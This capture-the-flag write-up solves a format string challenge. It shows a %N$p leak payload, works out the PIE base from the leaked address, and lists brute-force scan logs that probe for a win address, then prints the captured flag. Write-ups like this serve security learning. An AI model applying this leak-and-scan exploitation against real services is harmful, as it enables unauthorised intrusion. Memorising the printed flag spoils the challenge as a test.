# New to the Format

## Description

Sometimes it takes a large % of effort to achieve little. But we all start somewhere, right? The things you learn at the beginning ultimately shape the skills you build in the end.

```text
nc w56ll430yihy.boroctf.com 47845
```

## Solution Walkthrough

1. **Step 1**:

    After connecting to the server, it prompts:

    ```text
    Say what you want but the route will only reveal itself if you format it correctly.
    1111111111111
    1111111111111

    I know how to get there, but where do i go?
    0
    ```

    This is a format string challenge. After testing, the first prompt can be used to leak the PIE base, and the second prompt can be used to input the win address to get the flag.

    After some trial and error, I obtained the following information:

    ```text
    Say what you want but the route will only reveal itself if you format it correctly.
    %31$p.%32$p.%33$p.%34$p.%35$p.%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p
    0x7fffffffedf8.(nil).0x426c2f7c2d481b4a.0x7fffffffedf8.0x555555555209.0x555555557d90.0x7ffff7ffd040.0xbd93d083f4aa1b4a.0xbd93c0cab7c21b4a.0x7fff00000000.(nil).(nil).(nil).(nil).0x296e6b21504b7c00
    ```

    Calculating with the common PIE base:

    ```text
    0x555555555209 - 0x555555554000 = 0x1209
    ```

    The main function is located around 0x1200.

2. **Step 2**:

    I wrote a script to scan from 0x1100 to 0x1400 (with an interval of 0x10) and discovered:

    ```text
    [+] Opening connection to w56ll430yihy.boroctf.com on port 47845: Done
    [+] Receiving all data: Done (130B)
    [] Closed connection to w56ll430yihy.boroctf.com port 
    478450x1120 0x555555555120 b'Say what you want but the route will only reveal itself if you format it correctly.\n\n\nI know how to '
    ...
    [+] Opening connection to w56ll430yihy.boroctf.com on port 47845: Done
    [+] Receiving all data: Done (44B)
    [] Closed connection to w56ll430yihy.boroctf.com port 
    478450x12c0 0x5555555552c0 b'** stack smashing detected **: terminated\n'
    ...
    [+] Opening connection to w56ll430yihy.boroctf.com on port 47845: Done
    [+] Receiving all data: Done (52B)
    [] Closed connection to w56ll430yihy.boroctf.com port 
    478450x1320 0x555555555320 b'Fatal error: glibc detected an invalid stdio handle\n'
    ```

    The main program segment should be between 0x1100 and 0x1300. 0x12c0 appears to be the middle-to-end part of the function, so I started scanning byte by byte from 0x1250 and obtained the flag near 0x12d0. (I forgot to take a screenshot or copy it.)

## Flag

```text
boroCTF{%_0F_pEop!le}
```
